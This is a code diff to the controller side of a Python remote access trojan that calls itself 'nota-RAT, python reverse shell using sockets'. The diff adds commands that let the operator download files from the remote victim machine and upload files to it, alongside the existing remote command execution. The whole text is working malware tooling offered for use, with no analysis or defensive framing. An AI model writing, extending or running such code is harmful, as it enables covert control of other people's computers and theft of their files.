@@ -1,6 +1,6 @@
 import socket
 import argparse
-
+import os
 
 parser = argparse.ArgumentParser(
     description="nota-RAT, python reverse shell using sockets."
@@ -47,8 +47,28 @@ while True:
     if not command.strip():
         continue
     client_socket.send(command.encode())
-    if command.lower() == "exit":
+    if command == "exit":
         break
+    if command == "/getfile":
+        filename = input("Please enter the filename: ")
+        client_socket.send(filename.encode())
+        remaining = int.from_bytes(client_socket.recv(4),'big')
+        f = open(filename,"wb")
+        while remaining:
+            data = client_socket.recv(min(remaining,4096))
+            remaining -= len(data)
+            f.write(data)
+        f.close()
+    if command == "/sendfile":
+        filename = input("Please enter the filename: ")
+        client_socket.send(bytes(filename, "utf-8"))
+        if filename in os.listdir():
+            with open(filename, "rb") as f:
+                data = f.read()
+                dataLen = len(data)
+                client_socket.send(dataLen.to_bytes(4,'big'))
+                client_socket.send(data)
+            f.close()
     output = client_socket.recv(BUFFER_SIZE).decode()
     print("output:", output)
     results, cwd = output.split(SEPARATOR)
